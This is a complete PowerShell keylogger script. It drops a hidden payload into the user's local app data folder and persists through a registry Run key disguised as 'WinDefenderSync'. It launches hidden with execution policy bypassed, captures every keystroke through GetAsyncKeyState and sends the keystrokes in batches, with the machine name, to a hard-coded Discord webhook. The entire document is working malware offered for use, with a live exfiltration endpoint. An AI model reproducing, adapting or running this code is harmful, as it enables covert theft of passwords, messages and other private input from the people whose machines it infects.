# Configuration - YOUR SPECIFIC WEBHOOK
$W = "https://discord.com/api/webhooks/1504038539984113755/-YlOeox0lAsJLUETBjQImcHlD7PzbLacAjOetUX3pNDhkDBGkGZn4oGM-vGmnl_5LMHX"
$P = "WinDefenderSync"
$F = "$env:LOCALAPPDATA\win_sync.ps1"

# 1. The Core Logic (Handshake + Keylogger)
$C = @"
`$W = '$W'; `$N = `$env:COMPUTERNAME; `$L = ''

# Immediate Connection Message
try {
    `$ConnectPayload = @{
        username = "GHOST_`$N"
        content  = "⚡ [CONNECTION ESTABLISHED]: `$N is now online and logging."
    } | ConvertTo-Json
    Invoke-RestMethod -Uri `$W -Method Post -Body `$ConnectPayload -ContentType "application/json"
} catch {}

Add-Type -Type 'using System;using System.Runtime.InteropServices;public class K{[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);]}'

while(`$true){
    Start-Sleep -m 40
    for(`$i=8;`$i -le 190;`$i++){
        if([K]::GetAsyncKeyState(`$i) -eq -32767){
            `$k = [char]`$i
            if (`$k -eq '"') { `$k = "'" }
            if (`$k -eq '\') { `$k = "/" }
            `$L += `$k
            if (`$L.Length -ge 25) {
                `$Payload = @{
                    username = "GHOST_`$N"
                    content  = "[`$N]: `$L"
                } | ConvertTo-Json
                try {
                    Invoke-RestMethod -Uri `$W -Method Post -Body `$Payload -ContentType "application/json"
                    `$L = ''
                } catch {
                    Start-Sleep -s 10
                }
            }
        }
    }
}
"@

# 2. Drop and Persist
if (-not (Test-Path $F)) {
    $C | Out-File -FilePath $F -Encoding ascii -Force
    $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $Value = "powershell.exe -W H -NoP -Exec Bypass -File `"$F`""
    Set-ItemProperty -Path $RegPath -Name $P -Value $Value -Force
}

# 3. Execution (Fire and Forget)
Start-Process powershell.exe -ArgumentList "-W H -NoP -Exec Bypass -File `"$F`"" -WindowStyle Hidden
